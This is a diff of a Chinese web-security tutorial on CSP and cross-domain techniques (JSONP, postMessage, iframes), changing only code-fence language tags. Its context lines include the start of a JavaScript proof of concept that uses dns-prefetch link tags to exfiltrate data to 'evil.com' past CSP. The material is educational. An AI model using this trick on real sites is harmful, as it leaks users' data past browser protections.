@@ -108,7 +108,7 @@
 
 
 实验：在 https://jsbin.com 中粘贴以下代码，进行测试
-```
+```html
 <html>
 <head>
   <!-- CSP -->
@@ -146,7 +146,7 @@ JavaScript PoC - 实测chrome浏览器(版本 79.0.3945.88)中 可利用`vul.com
 
 原理:构造以下代码并执行. 作用是创建link标签并添加到body dom解析该标签时 就会以dns-prefetch机制发出DNS请求(携带数据)到`evil.com`
 
-```
+```javascript
 var evildomain = "evil.com";
 l=document.createElement('link');
 document.body.appendChild(l);
@@ -414,7 +414,7 @@ function foo(data){ // The function is named `foo`. It is a callback function.
 
 jQuery可以使用匿名函数
 
-```
+```javascript
 $.ajax({
     url:"http://database.B.com/open.php?callback=?",
     dataType:"jsonp",
@@ -437,7 +437,7 @@ $.ajax({
 
 
 a.com的a.html的内容:
-```
+```html
 <script>
 var iframe = document.createElement('iframe');//在域a.com下创建一个iframe元素
 
@@ -464,7 +464,7 @@ console.log("get data:",data2);
 ```
 
 b.com的b.html的内容:
-```
+```html
 <script>
     // 需要传输的数据
     // 数据格式可以自定义:json 字符串...
@@ -496,7 +496,7 @@ targetOrigin 用来指定即将接收到消息的window对象所在的那个域 
 ### 例6 - location.hash与iframe
 
 html中的锚链接
-```
+```html
 <a href='#简介'>click</a>
 ```
 
